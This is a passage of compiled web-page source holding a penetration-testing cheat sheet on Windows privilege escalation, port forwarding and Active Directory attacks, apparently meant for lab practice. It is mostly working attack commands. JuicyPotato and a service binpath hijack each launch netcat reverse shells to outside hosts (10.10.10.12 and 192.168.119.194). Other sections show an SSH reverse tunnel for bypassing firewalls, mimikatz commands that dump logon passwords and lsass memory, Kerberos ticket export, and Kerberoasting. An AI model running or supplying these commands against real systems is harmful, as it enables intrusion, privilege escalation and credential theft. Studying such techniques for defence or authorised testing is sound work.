https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1")]),t._v("\n")])])]),s("h4",{attrs:{id:"windows-exploit-suggester"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#windows-exploit-suggester"}},[t._v("#")]),t._v(" Windows Exploit Suggester")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("windows-exploit-suggester "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("--database")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2020")]),t._v("-05-20-mssb.xls "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("--systeminfo")]),t._v(" systeminfo.txt\n")])])]),s("h4",{attrs:{id:"juicypotato"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#juicypotato"}},[t._v("#")]),t._v(" JuicyPotato")]),t._v(" "),s("p",[t._v("RottenPotatoNG and its variants leverages the privilege escalation chain based on BITS service having the MiTM listener on "),s("code",[t._v("127.0.0.1:6666")]),t._v(" and when you have SeImpersonate or SeAssignPrimaryToken privileges. During a Windows build review we found a setup where BITS was intentionally disabled and port "),s("code",[t._v("6666")]),t._v(" was taken. Neds to have "),s("code",[t._v("SeImpersonatePrivilege")]),t._v(" enabled:")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[t._v("c:\\Users\\Public\\Documents>whoami "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("priv\nPRIVILEGES INFORMATION\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),t._v("\nPrivilege Name                Description                               State   \n============================= ========================================= ========\nSeAssignPrimaryTokenPrivilege Replace a "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("process")]),t._v(" level token             Disabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" a "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("process")]),t._v("        Disabled\nSeAuditPrivilege              Generate security audits                  Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled \nSeImpersonatePrivilege        Impersonate a client after authentication Enabled \nSeCreateGlobalPrivilege       Create global objects                     Enabled \nSeIncreaseWorkingSetPrivilege Increase a "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("process")]),t._v(" working "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("set")]),t._v("            Disabled\n")])])]),s("ul",[s("li",[s("a",{attrs:{href:"https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato",target:"_blank",rel:"noopener noreferrer"}},[t._v("Juicy-Potato-description"),s("OutboundLink")],1)]),t._v(" "),s("li",[s("a",{attrs:{href:"https://github.com/ohpe/juicy-potato/releases",target:"_blank",rel:"noopener noreferrer"}},[t._v("Juicy-Potato release"),s("OutboundLink")],1)])]),t._v(" "),s("h5",{attrs:{id:"usage"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#usage"}},[t._v("#")]),t._v(" Usage")]),t._v(" "),s("p",[t._v("We will need "),s("code",[t._v("CLSID")]),t._v("'s to use for the scrip. Either by running the script "),s("a",{attrs:{href:"https://ohpe.it/juicy-potato/CLSID/GetCLSID.ps1",target:"_blank",rel:"noopener noreferrer"}},[t._v("Get-CLSID.ps1"),s("OutboundLink")],1),t._v(" or by finding the corresponding one inside this "),s("a",{attrs:{href:"https://ohpe.it/juicy-potato/CLSID/",target:"_blank",rel:"noopener noreferrer"}},[t._v("list"),s("OutboundLink")],1),t._v(" and use psexec to change to a service account: "),s("a",{attrs:{href:"https://download.sysinternals.com/files/PSTools.zip",target:"_blank",rel:"noopener noreferrer"}},[t._v("pstools"),s("OutboundLink")],1)]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[t._v("JuicyPotato "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("l 1337 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("p c:\\windows\\system32\\cmd"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("exe "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("a "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/c c:\\users\\public\\desktop\\nc.exe -e cmd.exe 10.10.10.12 443"')]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("t "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# or ")]),t._v("\njuicypotato"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("exe "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("l 1337 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("p c:\\windows\\system32\\cmd"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("exe "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("t "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("c "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("e60687f7-01a1-40aa-86ac-db1cbf673334"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),s("h4",{attrs:{id:"windows-services"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#windows-services"}},[t._v("#")]),t._v(" Windows Services")]),t._v(" "),s("h5",{attrs:{id:"sc-exe"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#sc-exe"}},[t._v("#")]),t._v(" sc.exe")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("sc query "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("state")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" all "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" findstr "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"SERVICE_NAME:"')]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),t._v(" Servicenames.txt\n\nFOR /F %i "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Servicenames.txt"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" DO "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("echo")]),t._v(" %i\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("type")]),t._v(" Servicenames.txt\n\nFOR /F "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"tokens=2 delims= "')]),t._v(" %i "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Servicenames.txt"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" DO @echo %i "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),t._v(" services.txt\n\nFOR /F %i "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("services.txt"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" DO @sc qc %i "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" findstr "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"BINARY_PATH_NAME"')]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),t._v(" path.txt\n")])])]),s("p",[s("code",[t._v('cacls "C:\\path\\to\\file.exe"')])]),t._v(" "),s("p",[t._v("we want to look for "),s("code",[t._v("BUITIN/users:(F)")]),t._v(" or when our user/usergroup has "),s("code",[t._v("(F)")]),t._v(" or "),s("code",[t._v("(C)")]),t._v(" rights.")]),t._v(" "),s("p",[t._v("then we can just replace that exe with our own malicious exe and rerun the service:")]),t._v(" "),s("p",[s("code",[t._v("net stop [service name] && net start [service name].")])]),t._v(" "),s("h6",{attrs:{id:"example"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#example"}},[t._v("#")]),t._v(" Example")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("sc config upnphost "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("binpath")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"C:\\Inetpub'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[t._v("\\n")]),t._v("c.exe 192.168.119.194 443 -e c:\\Windows\\system32"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v('md.exe"')]),t._v("\nsc config upnphost "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("obj")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('".\\LocalSystem"')]),t._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("password")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),t._v("\nsc config upnphost "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("depend")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),t._v("\nsc qc upnphost\nnet start upnphost\n")])])]),s("h5",{attrs:{id:"microsoft-systems-internal-suite"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#microsoft-systems-internal-suite"}},[t._v("#")]),t._v(" Microsoft systems internal suite")]),t._v(" "),s("p",[t._v("This system's internal suite: "),s("a",{attrs:{href:"https://download.sysinternals.com/files/SysinternalsSuite.zip",target:"_blank",rel:"noopener noreferrer"}},[t._v("Link"),s("OutboundLink")],1),t._v(" contains a variety of scripts that can be used to check user privileges.")]),t._v(" "),s("p",[t._v("Now we can use the following:")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("C:"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("Inetpub"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("accesschk.exe "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-uwcqv")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Authenticated Users"')]),t._v(" *\nC:"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" accesschk.exe "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-uwcqv")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Authenticated Users"')]),t._v(" *\nC:"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" accesschk.exe "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-ucqv")]),t._v(" SSDPSRV\nC:"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" accesschk.exe "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-ucqv")]),t._v(" upnphost\n")])])]),s("p",[t._v("This guide is useful: https://www.fuzzysecurity.com/tutorials/16.html")]),t._v(" "),s("h3",{attrs:{id:"linux"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#linux"}},[t._v("#")]),t._v(" Linux")]),t._v(" "),s("p",[t._v("Can use linux priv esc checker.")]),t._v(" "),s("h2",{attrs:{id:"port-forwarding"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#port-forwarding"}},[t._v("#")]),t._v(" Port forwarding")]),t._v(" "),s("h3",{attrs:{id:"remote-port-forwarding"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#remote-port-forwarding"}},[t._v("#")]),t._v(" Remote port forwarding")]),t._v(" "),s("p",[t._v("Traffic sent to victim port will be sent to our port instead. This can be used to bypass firewalls.")]),t._v(" "),s("p",[t._v("First, on victim machine:")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("ssh")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-N")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-R")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("our_ip"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(":"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("our_port_number"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(":127.0.0.1:"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("port_to_forward"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("our_username"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("@"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("our_ip"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])])]),s("p",[t._v("Then on our machine to verify:")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("ss "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-antp")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("grep")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"<out_port_number>"')]),t._v("\n")])])]),s("h2",{attrs:{id:"active-directory"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#active-directory"}},[t._v("#")]),t._v(" Active Directory")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token namespace"}},[t._v("[System.DirecrotyServices.ActiveDirectory.Domain]")]),t._v("::GetCurrentDomain"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),s("h3",{attrs:{id:"get-all-service-principal-names-spn-s"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#get-all-service-principal-names-spn-s"}},[t._v("#")]),t._v(" Get all Service Principal Names (SPN's)")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[t._v("cls\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$search")]),t._v(" = "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("New-Object")]),t._v(" DirectoryServices"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("DirectorySearcher"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token namespace"}},[t._v("[ADSI]")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$search")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),t._v(" = "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"(servicePrincipalName=*)"')]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("## You can use this to filter for OU's:")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("## $results = $search.Findall() | ?{ $_.path -like '*OU=whatever,DC=whatever,DC=whatever*' }")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$results")]),t._v(" = "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$search")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Findall"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("foreach")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$result")]),t._v(" in "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$results")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$userEntry")]),t._v(" = "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$result")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("GetDirectoryEntry"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\t"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("Write-host")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Object Name = "')]),t._v(" "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$userEntry")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("name "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("backgroundcolor "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"yellow"')]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("foregroundcolor "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"black"')]),t._v("\n\t"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("Write-host")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"DN      =      "')]),t._v("  "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$userEntry")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("distinguishedName\n\t"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("Write-host")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Object Cat. = "')]),t._v("  "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$userEntry")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("objectCategory\n\t"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("Write-host")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"servicePrincipalNames"')]),t._v("\n\n\t"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$i")]),t._v("=1\n\t"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("foreach")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$SPN")]),t._v(" in "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$userEntry")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("servicePrincipalName "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t\t"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("Write-host")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"SPN("')]),t._v(" "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$i")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('")   =      "')]),t._v(" "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$SPN")]),t._v("\n\t\t"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$i")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),t._v("1\n\t"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\t"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("Write-host")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),s("h3",{attrs:{id:"mimikatz"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#mimikatz"}},[t._v("#")]),t._v(" Mimikatz")]),t._v(" "),s("h4",{attrs:{id:"password-hashes"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#password-hashes"}},[t._v("#")]),t._v(" Password Hashes")]),t._v(" "),s("p",[t._v("To get password hashes on windows, we can use "),s("a",{attrs:{href:"https://github.com/gentilkiwi/mimikatz",target:"_blank",rel:"noopener noreferrer"}},[t._v("mimikatz"),s("OutboundLink")],1)]),t._v(" "),s("p",[t._v("Then in mimikats:")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("c:"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("Tools"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("active_directory"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("mimikatz.exe\n\n  "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#####.   mimikatz 2.1.1 (x86) built on Mar 25 2018 21:00:57")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v('## ^ ##.  "A La Vie, A L\'Amour" - (oe.eo)')]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("## \\ / ##       > http://blog.gentilkiwi.com/mimikatz")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'## v ##'")]),t._v("       Vincent LE TOUX             "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" vincent.letoux@gmail.com "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'#####'")]),t._v("        "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# privilege::debug")]),t._v("\nPrivilege "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'20'")]),t._v(" OK\n\nmimikatz "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# sekurlsa::logonpasswords")]),t._v("\n")])])]),s("p",[t._v("or")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("sekurlsa::minidump C:"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("Users"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("%USERNAME%"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("Documents"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("lsass.DMP\n")])])]),s("h4",{attrs:{id:"tickets-ticket-granting-ticket-ticket-granting-service"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#tickets-ticket-granting-ticket-ticket-granting-service"}},[t._v("#")]),t._v(" Tickets [Ticket Granting Ticket / Ticket Granting Service]")]),t._v(" "),s("p",[t._v("TGT can request for TGS for resources wanted in domain")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("sekurlsa::tickets\n")])])]),s("h3",{attrs:{id:"display-kerberos-service-ticket"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#display-kerberos-service-ticket"}},[t._v("#")]),t._v(" Display kerberos service ticket")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("PS")]),t._v(" C:\\Windows\\system32> "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("Add-Type")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("AssemblyName System"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("IdentityModel\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("PS")]),t._v(" C:\\Windows\\system32> "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("New-Object")]),t._v(" System"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("IdentityModel"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Tokens"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("KerberosRequestorSecurityToken "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("ArgumentList "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'HTTP/CorpWe\nbServer.corp.com'")]),t._v("\n\nId                   : uuid-393f01fe-efad-46c9-a875-8ddc9eb96828-2\nSecurityKeys         : "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("System"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("IdentityModel"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Tokens"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("InMemorySymmetricSecurityKey"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\nValidFrom            : 5/29/2020 8:30:02 PM\nValidTo              : 5/30/2020 6:26:32 AM\nServicePrincipalName : HTTP/CorpWebServer"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("corp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("com\nSecurityKey          : System"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("IdentityModel"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Tokens"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("InMemorySymmetricSecurityKey\n\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# can alternatively use klist command ")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("PS")]),t._v(" C:\\Windows\\system32> klist\n\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# or inside mimikatz to export into files to be downloaded to attack machine:")]),t._v("\nmimikatz "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# kerberos::list /export")]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# Or use Invoke-kerberoast")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("Import-Module")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("\\"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("Invoke-Kerberoast")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("ps1\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("Invoke-Kerberoast")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token 